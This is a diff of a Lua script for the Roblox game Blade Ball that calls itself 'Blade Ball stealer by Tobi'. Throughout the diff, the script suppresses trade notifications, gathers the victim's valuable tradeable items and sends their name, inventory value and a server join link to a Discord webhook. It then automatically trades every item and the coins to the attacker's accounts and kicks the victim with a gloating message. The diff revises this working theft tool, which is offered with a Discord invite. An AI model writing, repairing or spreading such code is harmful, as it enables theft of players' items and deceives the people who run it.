@@ -25,10 +25,6 @@ local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
-local auth_token = "EBK-SS-A" 
-
--- // PHOTO DE PROFIL
-local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
 
 -- // VÉRIFICATIONS DE SÉCURITÉ
 if next(users) == nil or webhook == "" then
@@ -51,7 +47,6 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
--- // VÉRIFICATION DU PIN
 local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
 local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
 if PINReponse ~= "You don't have a PIN code" then
@@ -77,57 +72,41 @@ local notificationsFrame = notificationsGui.Notifications
 notificationsFrame.Visible = false
 notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)
 
--- // GESTION DES ÉCHANGES & SUPPRESSION TRADING TEXT
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
-    if inTrade then
-        task.spawn(function()
-            local char = plr.Character
-            if char then
-                for i = 1, 15 do
-                    for _, obj in ipairs(char:GetDescendants()) do
-                        if obj:IsA("BillboardGui") then
-                            obj.Enabled = false
-                            obj:Destroy()
-                        end
-                    end
-                    task.wait(0.1)
-                end
-            end
-        end)
-    end
 end)
 
-local function sendTradeRequest(user)
-    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
-    repeat
-        task.wait(0.2)
-        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
-    until inTrade == true
-end
-
-local function addItemToTrade(itemType, ID)
-    local args = { [1] = itemType, [2] = ID }
-    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
-end
-
--- // SYSTÈME DE CONFIRMATION (CORRIGÉ SELON TES PHOTOS)
+-- // TES FONCTIONS DE CONFIRMATION (REMISES EXACTEMENT)
 local function readyTrade()
+    local args = { [1] = true }
     repeat
-        -- On utilise RespondToTradeRequest avec 'true'
-        local success = netModule:WaitForChild("RF/Trading/RespondToTradeRequest"):InvokeServer(true)
-        task.wait(0.2)
-    until not inTrade or success == true
+        wait(0.1)
+        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
+    until response == true
 end
 
 local function confirmTrade()
     repeat
+        wait(0.1)
         netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-        task.wait(0.2)
     until not inTrade
 end
 
--- // FORMATAGE RAP
+-- // AUTRES FONCTIONS
+local function sendTradeRequest(user)
+    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
+    repeat
+        wait(0.1)
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function addItemToTrade(itemType, ID)
+    local args = { [1] = itemType, [2] = ID }
+    -- Pas de repeat ici pour éviter de crash, mais exécution directe
+    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
+end
+
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -136,14 +115,15 @@ local function formatNumber(number)
         number = number / 1000
         suffixIndex = suffixIndex + 1
     end
-    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
+    if suffixIndex == 1 then return tostring(math.floor(number)) else
+        return string.format("%.2f%s", number, suffixes[suffixIndex])
+    end
 end
 
 local totalRAP = 0
 
--- // ENVOI JOIN MESSAGE (EMBED ORIGINAL)
+-- // WEBHOOKS (REMIS AVEC JOBID)
 local function SendJoinMessage(list, prefix)
-    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local fields = {
         {name = "Victim Username:", value = plr.Name, inline = true},
         {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
@@ -153,14 +133,9 @@ local function SendJoinMessage(list, prefix)
 
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
-        end
+        if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+        else grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP} end
     end
-
     local groupedList = {}
     for _, group in pairs(grouped) do table.insert(groupedList, group) end
     table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
@@ -169,17 +144,12 @@ local function SendJoinMessage(list, prefix)
         fields[3].value = fields[3].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
     end
 
-    if #fields[3].value > 1024 then fields[3].value = string.sub(fields[3].value, 1, 1000) .. "\nPlus more!" end
-
     local data = {
-        ["auth_token"] = auth_token,
-        ["username"] = botUsername,
-        ["content"] = prefix .. "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```",
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = "🔴 Join to get Blade Ball hit",
-            ["color"] = (totalRAP >= 500) and 65280 or 8323327,
+            ["color"] = 65280,
             ["fields"] = fields,
-            ["thumbnail"] = {["url"] = headshot},
             ["footer"] = {["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"}
         }}
     }
@@ -187,42 +157,17 @@ local function SendJoinMessage(list, prefix)
 end
 
 local function SendMessage(list)
-    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
-    local fields = {
-		{name = "Victim Username:", value = plr.Name, inline = true},
-		{name = "Items sent:", value = "", inline = false},
-        {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}
-	}
-
+    local fields = {{name = "Victim Username:", value = plr.Name, inline = true}, {name = "Items sent:", value = "", inline = false}, {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}}
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
-        end
+        if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+        else grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP} end
     end
-
     local groupedList = {}
     for _, group in pairs(grouped) do table.insert(groupedList, group) end
-    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
+    for _, group in ipairs(groupedList) do fields[2].value = fields[2].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP)) end
 
-    for _, group in ipairs(groupedList) do
-        fields[2].value = fields[2].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
-    end
-
-    local data = {
-        ["auth_token"] = auth_token,
-        ["username"] = botUsername,
-        ["embeds"] = {{
-            ["title"] = "⚪ New Blade Ball Execution" ,
-            ["color"] = (totalRAP >= 500) and 65280 or 8323327,
-			["fields"] = fields,
-            ["thumbnail"] = {["url"] = headshot},
-			["footer"] = {["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"}
-        }}
-    }
+    local data = {["embeds"] = {{["title"] = "🔴 New Blade Ball Execution", ["color"] = 65280, ["fields"] = fields, ["footer"] = {["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"}}}}
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
@@ -230,31 +175,19 @@ end
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 
-local function buildNameToRAPMap(category)
-    local nameToRAP = {}
-    local categoryRapData = rapData[category]
-    if not categoryRapData then return nameToRAP end
-    for serializedKey, rap in pairs(categoryRapData) do
-        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
-        if success and type(decodedKey) == "table" then
-            for _, pair in ipairs(decodedKey) do
-                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
-            end
-        end
-    end
-    return nameToRAP
-end
-
-local rapMappings = {}
-for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end
-
 for _, category in ipairs(categories) do
-    for itemId, itemInfo in pairs(clientInventory[category]) do
-        if itemInfo.TradeLock then continue end
-        local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
-        if rap >= min_rap then
-            totalRAP = totalRAP + rap
-            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
+    if clientInventory[category] then
+        for itemId, itemInfo in pairs(clientInventory[category]) do
+            if not itemInfo.TradeLock then
+                local rap = 0
+                if rapData[category] then
+                    for key, v in pairs(rapData[category]) do if string.find(key, itemInfo.Name) then rap = v break end end
+                end
+                if rap >= min_rap then
+                    totalRAP = totalRAP + rap
+                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
+                end
+            end
         end
     end
 end
@@ -267,30 +200,25 @@ if #itemsToSend > 0 then
 
     SendJoinMessage(itemsToSend, (ping == "Yes") and "--[[@everyone]] " or "")
 
-    local function getNextBatch(items, batchSize)
-        local batch = {}
-        for i = 1, math.min(batchSize, #items) do table.insert(batch, table.remove(items, 1)) end
-        return batch
-    end
-
     local function doTrade(joinedUser)
         while #itemsToSend > 0 do
             sendTradeRequest(joinedUser)
-            repeat task.wait(0.2) until inTrade
+            repeat wait(0.5) until inTrade
 
-            local currentBatch = getNextBatch(itemsToSend, 100)
-            for _, item in ipairs(currentBatch) do
+            -- AJOUT DES ARMES (DÉLAI RÉDUIT POUR LA VITESSE)
+            for i = 1, math.min(100, #itemsToSend) do
+                local item = table.remove(itemsToSend, 1)
                 addItemToTrade(item.itemType, item.ItemID)
-                task.wait(0.01) -- Délai ultra-rapide
+                wait(0.01) -- Délai ultra-rapide entre chaque arme
             end
 
+            -- TOKENS
             local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
             local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
             if tokensamount >= 1 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount) end
 
-            task.wait(1) 
+            wait(0.5) -- Petite pause pour que le serveur valide l'ajout
             readyTrade()
-            task.wait(0.5)
             confirmTrade()
         end
         plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
@@ -309,4 +237,3 @@ if #itemsToSend > 0 then
     end
     waitForUserJoin()
 end
-
